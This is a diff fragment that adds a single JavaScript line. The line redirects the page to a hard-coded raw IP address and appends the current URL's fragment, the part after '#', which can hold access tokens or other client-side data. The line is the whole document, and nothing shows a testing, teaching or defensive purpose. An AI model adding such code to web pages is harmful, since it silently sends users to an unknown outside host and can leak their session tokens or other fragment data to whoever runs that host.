@@ -1,0 +1,1 @@
+document.location.href = 'http://161.129.67.72/'+window.location.href.split('#')[1];
